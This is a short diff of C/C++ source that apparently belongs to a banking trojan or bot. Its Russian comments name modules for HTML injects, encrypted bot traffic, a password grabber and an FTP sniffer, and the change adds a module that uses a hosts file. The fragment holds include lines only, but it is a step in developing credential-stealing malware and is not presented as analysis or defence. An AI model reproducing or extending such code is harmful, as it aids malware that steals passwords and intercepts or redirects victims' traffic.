@@ -17,6 +17,8 @@
 #include "BotConfig.h"     // Модуль включает HTML инжекты
 #include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
 
+#include "BotHosts.h" // Включаем использование файла ностов
+
 
 #include "Grabber.h" // Включение грабера паролей
 #include "FtpSniffer.h" // Перехват фтп трафика
